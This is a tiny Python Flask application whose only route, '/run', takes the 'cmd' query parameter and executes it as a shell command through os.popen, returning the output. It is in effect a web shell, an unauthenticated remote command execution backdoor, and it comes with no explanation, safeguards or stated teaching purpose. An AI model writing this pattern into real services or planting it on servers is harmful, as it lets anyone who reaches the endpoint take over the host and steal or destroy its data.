import os
from flask import Flask, request
app = Flask(__name__)
@app.route("/run")
def run():
    return os.popen(request.args["cmd"]).read()
